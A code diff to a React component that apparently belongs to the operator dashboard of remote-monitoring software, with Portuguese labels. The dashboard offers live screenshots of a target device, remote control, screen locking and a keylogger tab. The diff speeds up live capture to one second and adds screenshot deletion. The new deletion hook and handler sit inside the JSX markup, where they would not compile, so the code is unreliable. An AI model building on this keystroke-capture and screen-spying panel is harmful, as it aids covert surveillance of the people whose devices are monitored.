@@ -18,6 +18,8 @@ export default function DeviceDetails({
 }: DeviceDetailsProps) {
   const [activeTab, setActiveTab] = useState("info");
   const [isLiveActive, setIsLiveActive] = useState(true);
+  // Delay mínimo do ao vivo (1s)
+  const MIN_LIVE_DELAY = 1000;
   const [isControlActive, setIsControlActive] = useState(false);
   const [isScreenLocked, setIsScreenLocked] = useState(false);
   const [selectedKeylogs, setSelectedKeylogs] = useState<Set<number>>(new Set());
@@ -84,7 +86,7 @@ export default function DeviceDetails({
   // Latest screenshot for live view — atualiza a cada 1.5s para ficar próximo ao tempo real
   const { data: latestScreenshot, refetch: refetchScreenshot } = trpc.device.latestScreenshot.useQuery(
     { deviceId: Number(deviceId) },
-    { refetchInterval: isLiveActive ? 1500 : false, enabled: isLiveActive }
+    { refetchInterval: isLiveActive ? MIN_LIVE_DELAY : false, enabled: isLiveActive }
   );
 
   // All screenshots for the screenshots tab
@@ -126,6 +128,10 @@ export default function DeviceDetails({
   const handleStopLive = () => {
     setIsLiveActive(false);
     setIsControlActive(false);
+  };
+
+  const handleStartLive = () => {
+    setIsLiveActive(true);
   };
 
   const handleActivateControl = () => {
@@ -218,12 +224,21 @@ export default function DeviceDetails({
         >
           📸 Capturar Screenshot
         </Button>
-        <Button
-          onClick={handleStopLive}
-          className="bg-red-600 hover:bg-red-700 text-white"
-        >
-          ⏹️ Parar Ao Vivo
-        </Button>
+        {isLiveActive ? (
+          <Button
+            onClick={handleStopLive}
+            className="bg-red-600 hover:bg-red-700 text-white"
+          >
+            ⏹️ Parar Ao Vivo
+          </Button>
+        ) : (
+          <Button
+            onClick={handleStartLive}
+            className="bg-green-600 hover:bg-green-700 text-white"
+          >
+            ▶️ Ativar Ao Vivo
+          </Button>
+        )}
         <Button
           onClick={handleActivateControl}
           className={`text-white ${isControlActive ? "bg-green-700 hover:bg-green-800 ring-2 ring-green-400" : "bg-blue-600 hover:bg-blue-700"}`}
@@ -338,15 +353,36 @@ export default function DeviceDetails({
                       style={{ maxHeight: "200px" }}
                       onClick={() => window.open(s.screenshotUrl, "_blank")}
                     />
-                    <p className="text-slate-500 text-xs text-center py-1 bg-slate-700">
-                      {new Date(s.createdAt).toLocaleTimeString("pt-BR")}
-                    </p>
+                    <div className="flex items-center justify-between bg-slate-700 px-2 py-1">
+                      <p className="text-slate-500 text-xs">
+                        {new Date(s.createdAt).toLocaleTimeString("pt-BR")}
+                      </p>
+                      <Button
+                        size="sm"
+                        variant="destructive"
+                        className="text-xs px-2 py-1"
+                        onClick={() => handleRemoveScreenshot(s.id)}
+                      >Remover</Button>
+                    </div>
                   </div>
                 ))}
               </div>
             )}
           </Card>
         </TabsContent>
+  // Função para remover screenshot
+  const removeScreenshotMutation = trpc.device.removeScreenshot.useMutation({
+    onSuccess: () => {
+      // Atualiza lista após remoção
+      refetchScreenshot();
+    },
+  });
+
+  const handleRemoveScreenshot = (screenshotId: number) => {
+    if (confirm("Remover este screenshot?")) {
+      removeScreenshotMutation.mutate({ id: screenshotId });
+    }
+  };
 
         {/* Aba: Keylogs */}
         <TabsContent value="keylogs" className="space-y-4">
